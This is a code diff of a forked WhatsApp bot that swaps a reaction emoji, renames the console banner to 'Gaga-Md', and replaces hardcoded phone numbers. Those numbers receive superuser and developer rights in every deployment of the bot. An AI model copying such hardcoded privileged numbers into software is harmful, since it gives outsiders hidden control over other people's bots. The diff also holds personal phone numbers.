@@ -424,7 +424,7 @@ if (conf.AUTO_REACT_STATUS === "yes") {
                         await zk.sendMessage(message.key.remoteJid, {
                             react: {
                                 key: message.key,
-                                text: "❤️",
+                                text: "🥷",
                             },
                         }, {
                             statusJidList: [message.key.participant, adams],
@@ -486,19 +486,19 @@ if (conf.AUTO_REACT_STATUS === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254111385747';
-            const dj2 = '254732297194';
-            const dj3 = "254748851027";
-            const luffy = '254114141192';
+            const dj = '254112291443';
+            const dj2 = '254729269118';
+            const dj3 = "254112291443";
+            const luffy = '254729269118';
             const sudo = await getAllSudoNumbers();
-            let goat = "254732297194";
+            let goat = "254112291443";
             const superUserNumbers = [servBot, goat, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{popkid-Md}...[][]");
+            console.log("\t [][]...{Gaga-Md}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message sent from : " + nomGroupe);
